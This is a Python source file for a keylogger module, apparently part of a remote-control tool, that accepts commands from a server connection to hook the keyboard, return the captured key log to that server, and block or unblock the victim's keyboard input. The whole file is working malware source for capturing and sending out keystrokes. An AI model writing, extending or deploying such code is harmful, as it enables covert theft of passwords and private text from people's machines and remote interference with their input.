from Hooker import Hooker
import threading


class KeyLogger:
    def __init__(self, server):
        self.server = server
        self.hooker = Hooker()
        self.thread = None

    def start_listening(self, s):
        dict = {
            "PRINT": self.print_keys,
            "HOOK": self.hook_keys,
            "UNHOOK": self.unhook_keys,
            "BLOCK": self.block_keys,
            "UNBLOCK": self.unblock_keys,
        }

        if s in dict:
            dict[s]()
            return True

        return False

    def hook_keys(self):
        self.thread = threading.Thread(target=self.hooker.start)
        self.thread.start()

        while self.hooker.is_hooked is None:
            pass

        if self.hooker.is_hooked:
            self.server.send_obj("Success")

        else:
            self.server.send_obj("Failed")

    def unhook_keys(self):
        self.hooker.stop()

    def print_keys(self):
        s = self.hooker.get_key_log()
        self.server.send_obj(s)

    def block_keys(self):
        ok = self.hooker.block()

        if ok:
            print('s')
            self.server.send_obj("Success")
        else:
            print('f')
            self.server.send_obj("Failed")

    def unblock_keys(self):
        self.hooker.unblock()

    def stop(self):
        try:
            self.hooker.get_key_log()
        finally:
            self.unhook_keys()
            self.unblock_keys()

        if self.thread:
            self.thread.join()
            self.thread = None